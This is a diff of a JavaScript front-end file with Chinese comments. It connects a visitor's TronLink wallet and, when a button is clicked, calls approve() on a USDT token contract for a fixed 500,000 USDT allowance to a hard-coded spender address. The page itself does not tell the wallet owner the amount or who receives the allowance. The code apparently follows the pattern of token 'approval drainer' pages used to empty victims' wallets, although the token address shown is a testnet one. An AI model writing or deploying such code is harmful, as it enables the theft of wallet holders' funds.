@@ -1,6 +1,12 @@
+// usdtApprove.js — 授权固定 50万 USDT
+
+// ====== TRON 链配置 ======
+const shastaUsdtAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";
+const spenderAddress = "TATnJboVWDD6Q1evxZUVwubPzoGr6e654B"; // 你的合约地址
+
 // ====== 固定授权额度：50万 USDT ======
 function getLargeEnoughAmount() {
-  return "50000000000000";  // 50万 * 10^6
+  return "50000000000000";  // 50万 * 10^6，USDT精度是6位
 }
 
 window.approveUSDT = async function() {
@@ -12,7 +18,7 @@ window.approveUSDT = async function() {
       throw new Error("请先连接钱包");
     }
 
-    const amount = getLargeEnoughAmount();  // 调用正确的函数名
+    const amount = getLargeEnoughAmount();
 
     console.log("授权金额(最小单位):", amount);
 
@@ -20,7 +26,7 @@ window.approveUSDT = async function() {
 
     // 直接授权固定金额
     const result = await usdtContract.approve(spenderAddress, amount).send({
-      feeLimit: 100000000,
+      feeLimit: 100_000_000,
       callValue: 0
     });
 
@@ -44,3 +50,62 @@ window.approveUSDT = async function() {
     }, 1000);
   }
 };
+
+// ====== 辅助函数 ======
+function setStatus(text, isError = false) {
+  const el = document.getElementById("status");
+  if (el) {
+    el.innerText = `状态：${text}`;
+    el.style.color = isError ? 'red' : 'black';
+  }
+  console.log("状态更新:", text);
+}
+
+// ====== 页面初始化 ======
+window.addEventListener("DOMContentLoaded", () => {
+  const connectBtn = document.getElementById("connectBtn");
+  const approveBtn = document.getElementById("approveBtn");
+
+  console.log("页面加载完成 - 授权 50万 USDT");
+
+  if (window.tronWeb && window.tronWeb.ready) {
+    const address = window.tronWeb.defaultAddress.base58;
+    setStatus(`已连接: ${address.substring(0, 8)}...`);
+    approveBtn.disabled = false;
+  }
+
+  connectBtn.addEventListener("click", async () => {
+    try {
+      setStatus("正在连接钱包...");
+
+      if (typeof window.tronLink === 'undefined') {
+        throw new Error("未检测到 TronLink 插件");
+      }
+
+      await window.tronLink.request({ method: 'tron_requestAccounts' });
+
+      await new Promise((resolve) => {
+        const check = setInterval(() => {
+          if (window.tronWeb && window.tronWeb.ready) {
+            clearInterval(check);
+            resolve();
+          }
+        }, 100);
+      });
+
+      const address = window.tronWeb.defaultAddress.base58;
+      setStatus(`✅ 连接成功: ${address.substring(0, 8)}...`);
+      approveBtn.disabled = false;
+
+    } catch (error) {
+      console.error("连接失败:", error);
+      setStatus("❌ 连接失败: " + error.message, true);
+    }
+  });
+
+  approveBtn.addEventListener("click", () => {
+    window.approveUSDT();
+  });
+});
+
+console.log("授权 50万 USDT 脚本加载完成");
